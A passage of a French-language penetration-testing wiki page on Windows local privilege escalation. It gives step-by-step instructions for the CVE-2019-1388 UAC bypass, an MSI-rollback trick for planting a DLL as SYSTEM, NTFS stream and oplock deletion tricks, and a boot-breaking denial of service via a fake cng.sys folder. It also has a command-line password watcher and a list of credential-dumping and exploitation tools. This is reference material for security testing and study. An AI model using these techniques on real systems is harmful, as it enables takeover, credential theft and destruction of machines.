### Extensions de fichiers pouvant exécuter du code sous Windows

Consultez la page **https://filesec.io/**

### **Surveiller les lignes de commande pour les mots de passe**

Lorsque vous obtenez un shell en tant qu'utilisateur, il peut y avoir des tâches planifiées ou d'autres processus exécutés qui **passent des identifiants sur la ligne de commande**. Le script ci-dessous capture les lignes de commande des processus toutes les deux secondes et compare l'état actuel avec l'état précédent, affichant les différences éventuelles.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Voler des mots de passe depuis des processus

## De Low Priv User à NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Si vous avez accès à l'interface graphique (via console ou RDP) et que UAC est activé, dans certaines versions de Microsoft Windows il est possible d'exécuter un terminal ou tout autre processus tel que "NT\AUTHORITY SYSTEM" depuis un utilisateur non privilégié.

Cela permet d'escalader les privilèges et de contourner UAC en même temps avec la même vulnérabilité. De plus, il n'est pas nécessaire d'installer quoi que ce soit et le binaire utilisé pendant le processus est signé et délivré par Microsoft.

Certains des systèmes affectés sont les suivants:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Pour exploiter cette vulnérabilité, il faut effectuer les étapes suivantes :
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Lisez ceci pour **apprendre sur les Integrity Levels** :


{{#ref}}
integrity-levels.md
{{#endref}}

Puis **lisez ceci pour comprendre UAC et les UAC bypasses :**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

La technique décrite [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) avec un exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

L'attaque consiste essentiellement à abuser de la feature de rollback de Windows Installer pour remplacer des fichiers légitimes par des fichiers malveillants pendant le processus de désinstallation. Pour cela, l'attaquant doit créer un **malicious MSI installer** qui sera utilisé pour détourner le dossier `C:\Config.Msi`, qui sera ensuite utilisé par le Windows Installer pour stocker les fichiers de rollback pendant la désinstallation d'autres packages MSI où les fichiers de rollback auront été modifiés pour contenir la payload malveillante.

La technique résumée est la suivante :

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> À ce stade, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> Les ACLs sont **seulement appliquées à l'ouverture du handle**, donc vous pouvez toujours écrire dans le dossier.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

La principale technique de rollback MSI (la précédente) suppose que vous pouvez supprimer un **dossier entier** (par exemple `C:\Config.Msi`). Mais que faire si votre vulnérabilité ne permet que la **suppression arbitraire de fichiers** ?

Vous pouvez exploiter les internals NTFS : chaque dossier a un flux de données alternatif caché appelé :
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Ce stream stocke les **métadonnées d'index** du dossier.

Donc, si vous **supprimez le stream `::$INDEX_ALLOCATION`** d'un dossier, NTFS **supprime entièrement le dossier** du système de fichiers.

Vous pouvez faire cela en utilisant des API standard de suppression de fichiers comme :
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Même si vous appelez une API de suppression de *fichier*, elle **supprime le dossier lui-même**.

### De la suppression du contenu d'un dossier à SYSTEM EoP
Et si votre primitive ne vous permettait pas de supprimer des fichiers/dossiers arbitraires, mais qu'elle **autorise la suppression du *contenu* d'un dossier contrôlé par l'attaquant** ?

1. Étape 1 : Préparer un dossier leurre et un fichier
- Créer : `C:\temp\folder1`
- À l'intérieur : `C:\temp\folder1\file1.txt`

2. Étape 2 : Placer un **oplock** sur `file1.txt`
- L'oplock **met l'exécution en pause** lorsqu'un processus privilégié essaie de supprimer `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Étape 3 : Déclencher le processus SYSTEM (e.g., `SilentCleanup`)
- Ce processus parcourt les dossiers (e.g., `%TEMP%`) et tente de supprimer leur contenu.
- Lorsqu'il atteint `file1.txt`, le **oplock se déclenche** et transmet le contrôle à votre callback.

4. Étape 4 : Dans le callback de l'oplock – rediriger la suppression

- Option A : Déplacer `file1.txt` ailleurs
- Cela vide `folder1` sans rompre l'oplock.
- Ne supprimez pas `file1.txt` directement — cela libérerait l'oplock prématurément.

- Option B : Convertir `folder1` en **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: Créer un **symlink** dans `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Ceci cible le flux interne NTFS qui stocke les métadonnées du dossier — le supprimer supprime le dossier.

5. Étape 5 : Libérer l'oplock
- Le processus SYSTEM continue et tente de supprimer `file1.txt`.
- Mais maintenant, à cause de la junction + symlink, il supprime en réalité :
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Résultat**: `C:\Config.Msi` est supprimé par SYSTEM.

### From Arbitrary Folder Create to Permanent DoS

Exploitez une primitive qui vous permet de **create an arbitrary folder as SYSTEM/admin** — même si **vous ne pouvez pas écrire de fichiers** ou **définir des permissions faibles**.

Créez un **dossier** (pas un fichier) portant le nom d'un **critical Windows driver**, par ex.:
```
C:\Windows\System32\cng.sys
```
- Ce chemin correspond normalement au pilote en mode noyau `cng.sys`.
- Si vous le **pré-créez en tant que dossier**, Windows ne parvient pas à charger le pilote réel au démarrage.
- Ensuite, Windows tente de charger `cng.sys` pendant le boot.
- Il voit le dossier, **ne parvient pas à charger le pilote réel**, et **provoque un crash ou interrompt le démarrage**.
- Il n'existe **aucun mécanisme de secours**, et **aucune récupération** sans intervention externe (p. ex., réparation du démarrage ou accès au disque).


## **De High Integrity à SYSTEM**

### **Nouveau service**

Si vous exécutez déjà un processus High Integrity, le **chemin vers SYSTEM** peut être simple : il suffit de **créer et exécuter un nouveau service** :
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Lorsque vous créez un service binaire, assurez-vous que c'est un service valide ou que le binaire effectue les actions nécessaires suffisamment rapidement car il sera tué au bout de 20s s'il n'est pas un service valide.

### AlwaysInstallElevated

Depuis un processus High Integrity vous pouvez essayer d'**activer les entrées de registre AlwaysInstallElevated** et **installer** un reverse shell en utilisant un wrapper _**.msi**_.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Vous pouvez** [**trouver le code ici**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Si vous avez ces privilèges de token (probablement trouvés dans un processus déjà High Integrity), vous serez capable d'**ouvrir presque n'importe quel process** (pas les processus protégés) avec le privilège SeDebug, **copier le token** du process et créer un **process arbitraire avec ce token**.\
L'usage de cette technique consiste généralement à **sélectionner un process tournant en tant que SYSTEM avec tous les privilèges de token** (_oui, vous pouvez trouver des processus SYSTEM sans tous les privilèges de token_).\
**Vous pouvez trouver un** [**exemple de code exécutant la technique proposée ici**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Cette technique est utilisée par meterpreter pour escalader dans `getsystem`. La technique consiste à **créer un pipe puis créer/abuser d'un service pour écrire dans ce pipe**. Ensuite, le **serveur** qui a créé le pipe en utilisant le privilège **`SeImpersonate`** pourra **s'imposer le token** du client du pipe (le service) obtenant les privilèges SYSTEM.\
Si vous voulez [**en savoir plus sur les name pipes vous devriez lire ceci**](#named-pipe-client-impersonation).\
Si vous voulez lire un exemple de [**comment passer de high integrity à System en utilisant des name pipes vous devriez lire ceci**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Si vous parvenez à **hijacker une dll** chargée par un **process** s'exécutant en **SYSTEM**, vous pourrez exécuter du code arbitraire avec ces permissions. Par conséquent Dll Hijacking est également utile pour ce type d'escalade de privilèges, et, de plus, il est bien **plus facile à réaliser depuis un processus high integrity** car il disposera des **permissions d'écriture** sur les dossiers utilisés pour charger les dlls.\
**Vous pouvez** [**en apprendre plus sur Dll hijacking ici**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Vérifie les misconfigurations et les fichiers sensibles (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Détecté.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Vérifie certaines misconfigurations possibles et collecte des infos (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Vérifie les misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrait les informations de sessions sauvegardées de PuTTY, WinSCP, SuperPuTTY, FileZilla et RDP. Utiliser -Thorough en local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrait les identifiants du Credential Manager. Détecté.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray les mots de passe collectés à travers le domaine**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh est un spoofer ADIDNS/LLMNR/mDNS/NBNS et un outil man-in-the-middle en PowerShell.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Énumération basique Windows pour privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Recherche des vulnérabilités privesc connues (DÉPRÉCIÉ en faveur de Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Vérifications locales **(Nécessite droits Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Recherche des vulnérabilités privesc connues (doit être compilé avec VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Énumère l'hôte à la recherche de misconfigurations (plutôt un outil de collecte d'infos que de privesc) (doit être compilé) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrait les identifiants de nombreux logiciels (exe précompilé sur github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port de PowerUp en C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Vérifie les misconfigurations (exécutable précompilé sur github). Non recommandé. Ne fonctionne pas bien sous Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Vérifie les possibles misconfigurations (exe depuis python). Non recommandé. Ne fonctionne pas bien sous Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Outil créé d'après ce post (n'a pas besoin d'accesschk pour fonctionner correctement mais peut l'utiliser).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lit la sortie de **systeminfo** et recommande des exploits fonctionnels (python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lit la sortie de **systeminfo** et recommande des exploits fonctionnels (python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Vous devez compiler le projet en utilisant la version correcte de .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Pour voir la version de .NET installée sur la machine victime, vous pouvez faire :
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Références

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper : Format-string leak + stack BOF → VirtualAlloc ROP (RCE) et kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – À la poursuite du Silver Fox : Chat et souris dans les ombres du kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
